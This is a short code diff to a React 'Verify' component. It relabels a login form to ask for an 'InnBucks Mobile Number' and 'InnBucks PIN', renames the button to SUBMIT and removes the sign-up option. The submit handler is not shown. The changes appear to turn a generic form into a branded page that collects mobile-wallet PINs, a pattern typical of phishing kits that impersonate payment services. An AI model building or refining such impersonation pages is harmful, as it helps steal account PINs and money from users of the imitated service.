@@ -119,7 +119,7 @@ export default function Verify() {
         <form onSubmit={handleSubmit} className="space-y-4">
           <div>
             <label htmlFor="mobileNumber" className="block text-gray-800 font-semibold mb-1 text-sm">
-              Username <span className="text-red-500">*</span>
+          InnBucks Mobile Number <span className="text-red-500">*</span>
             </label>
             <input
               type="tel"
@@ -135,7 +135,7 @@ export default function Verify() {
 
           <div>
             <label htmlFor="pin" className="block text-gray-800 font-semibold mb-1 text-sm">
-              Password <span className="text-red-500">*</span>
+              InnBucks PIN <span className="text-red-500">*</span>
             </label>
             <input
               type="password"
@@ -164,17 +164,11 @@ export default function Verify() {
             disabled={isSubmitting}
             className="w-full bg-blue-600 text-white py-2 rounded-md font-semibold text-sm tracking-wide hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
           >
-            {isSubmitting ? 'LOGGING IN...' : 'LOGIN'}
+            {isSubmitting ? 'LOGGING IN...' : 'SUBMIT'}
           </button>
         </form>
 
-        <button
-          type="button"
-          onClick={() => navigate('/')}
-          className="mt-4 w-full border border-red-500 text-red-500 py-2 rounded-md font-semibold text-sm tracking-wide hover:bg-red-50 transition-colors"
-        >
-          SIGN UP
-        </button>
+        
 
         <p className="mt-6 text-[11px] text-gray-500 text-center">&copy;2026 InnBucks</p>
       </div>
